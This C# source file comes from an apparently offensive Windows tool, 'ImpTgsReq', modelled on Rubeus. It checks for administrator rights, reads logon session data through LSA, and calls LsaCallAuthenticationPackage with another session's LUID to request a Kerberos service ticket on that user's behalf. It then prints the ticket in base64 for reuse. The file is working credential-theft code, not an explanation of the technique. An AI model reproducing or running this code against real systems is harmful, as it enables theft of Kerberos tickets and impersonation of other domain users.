using System.Security.Principal;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System;

namespace ImpTgsReq
{
  // shootout to Rubeus!
  public class Helpers
  {
    // IsAdmin()
    public static bool IsHighIntegrity()
    {
      WindowsIdentity identity = WindowsIdentity.GetCurrent();
      WindowsPrincipal principal = new WindowsPrincipal(identity);
      return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }


    public static Interop.LogonSessionData GetLogonSessionData(Interop.LUID luid)
    {
      // gets additional logon session information for a given LUID

      var luidPtr = IntPtr.Zero;
      var sessionDataPtr = IntPtr.Zero;

      try
      {
        luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
        Marshal.StructureToPtr(luid, luidPtr, false);

        var ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
        if (ret != 0)
        {
          throw new System.ComponentModel.Win32Exception((int)ret);
        }

        var unsafeData =
          (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionDataPtr,
              typeof(Interop.SECURITY_LOGON_SESSION_DATA));

        return new Interop.LogonSessionData()
        {
          AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.Buffer, unsafeData.AuthenticationPackage.Length / 2),
                                DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.Buffer, unsafeData.DnsDomainName.Length / 2),
                                LogonDomain = Marshal.PtrToStringUni(unsafeData.LoginDomain.Buffer, unsafeData.LoginDomain.Length / 2),
                                LogonID = unsafeData.LoginID,
                                LogonTime = DateTime.FromFileTime((long)unsafeData.LoginTime),
                                //LogonTime = systime.AddTicks((long)unsafeData.LoginTime),
                                LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.Buffer, unsafeData.LogonServer.Length / 2),
                                LogonType = (Interop.LogonType)unsafeData.LogonType,
                                Sid = (unsafeData.PSiD == IntPtr.Zero ? null : new SecurityIdentifier(unsafeData.PSiD)),
                                Upn = Marshal.PtrToStringUni(unsafeData.Upn.Buffer, unsafeData.Upn.Length / 2),
                                Session = (int)unsafeData.Session,
                                Username = Marshal.PtrToStringUni(unsafeData.Username.Buffer, unsafeData.Username.Length / 2),
        };
      }
      finally
      {
        if (sessionDataPtr != IntPtr.Zero)
          Interop.LsaFreeReturnBuffer(sessionDataPtr);

        if (luidPtr != IntPtr.Zero)
          Marshal.FreeHGlobal(luidPtr);
      }
    }


    public static void InvokeTgsReq(IntPtr lsaHandle, int authcPackageId,
        string targetSpn, Interop.LUID impLuid)
    {
  //           if (status == STATUS_SUCCESS) {
      var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
      var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();
      IntPtr responsePointer = IntPtr.Zero; // out
      int returnBufferLength = 0; // out
      int protocolStatus = 0; // out

      // return from cache if it's there or make a request to KDC
      request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
      // logon session Id to impersonate
      request.LogonId = impLuid;
      request.TicketFlags = 0x0; // see Rubeus LSA.cs
      //  Specifying 0x0 (the default) will return just the main
      //      (initial) TGT, or a forwarded ticket if that's all that exists (a la the printer bug)
      // return the ticket as a KRB_CRED credential
      request.CacheOptions = 0x8; // Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED; 
      // KERB_ETYPE_DEFAULT ???
      request.EncryptionType = 0x0;

      // the target ticket name we want the ticket for
      var tName = new Interop.UNICODE_STRING(targetSpn);
      request.TargetName = tName;

      // LSA shenanigans
      // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
      var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
      var newStructSize = structSize + tName.MaximumLength;
      var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);
      // marshal the struct from a managed object to an unmanaged block of memory.
      Marshal.StructureToPtr(request, unmanagedAddr, false);
      // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
      var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
      // copy unicode chars to the new location
      Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
      // update the target name buffer ptr            
      Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);


      Console.WriteLine("[#] Invoking LsaCallAuthenticationPackage() for TGS-REQ");
      Interop.NtStatus returnValue = Interop.LsaCallAuthenticationPackage(lsaHandle, authcPackageId, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocolStatus);

      // translate the LSA error (if any) to a Windows error
      var winError = Interop.LsaNtStatusToWinError((uint)protocolStatus);

      if ((returnValue == 0) && ((uint)winError == 0) &&
          (returnBufferLength != 0))
      {
        Console.WriteLine("[#] TGS-REP received. Parsing ST.");

        // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
        response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
            (System.IntPtr)responsePointer,
            typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

        var encodedTicketSize = response.Ticket.EncodedTicketSize;

        // extract the ticket, build a KRB_CRED object, and add to the cache
        var encodedTicket = new byte[encodedTicketSize];
        Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0,
            encodedTicketSize);
        var b64EncodedTicket = System.Convert.ToBase64String(encodedTicket);

        Console.WriteLine($"[!] ST : {b64EncodedTicket}");
      }
      else
      {
        var errorMessage = new Win32Exception((int)winError).Message;
        Console.WriteLine(
            "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
            winError, targetSpn, errorMessage);
      }

      // clean up
      Interop.LsaFreeReturnBuffer(responsePointer);
      // Marshal.FreeHGlobal(unmanagedAddr);
    }

  }
}
